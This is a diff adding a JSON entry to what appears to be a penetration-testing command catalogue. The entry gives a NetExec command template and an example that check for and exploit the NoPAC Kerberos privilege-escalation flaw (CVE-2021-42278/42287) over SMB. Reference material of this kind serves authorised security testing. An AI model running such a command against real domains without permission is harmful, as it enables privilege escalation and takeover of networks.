@@ -1,0 +1,26 @@
+{
+  "id": "nxc-smb-nopac",
+  "name": "NetExec SMB NoPAC",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M nopac",
+  "description": "Check for and exploit the NoPAC (CVE-2021-42278/42287) Kerberos privilege escalation vulnerability",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb",
+    "kerberos"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "nopac",
+    "cve-2021-42278",
+    "cve-2021-42287",
+    "privilege-escalation",
+    "kerberos"
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'user' -p 'password' -M nopac"
+  ]
+}
